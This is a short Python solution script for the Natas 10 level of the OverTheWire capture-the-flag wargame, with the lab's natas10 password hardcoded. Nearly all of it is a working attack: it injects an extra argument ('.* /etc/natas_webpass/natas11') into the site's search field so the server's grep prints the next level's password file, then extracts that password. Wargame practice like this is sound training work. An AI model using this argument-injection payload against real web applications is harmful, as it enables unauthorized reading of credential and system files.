import requests
import re

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = "http://natas10.natas.labs.overthewire.org/"

data = { "needle" : ".* /etc/natas_webpass/natas11", "submit" : "submit" }

session = requests.session()
response = session.post(url,auth=(username,password),data=data)
content = response.text

print(re.findall("/etc/natas_webpass/natas11:(.*)",content)[0])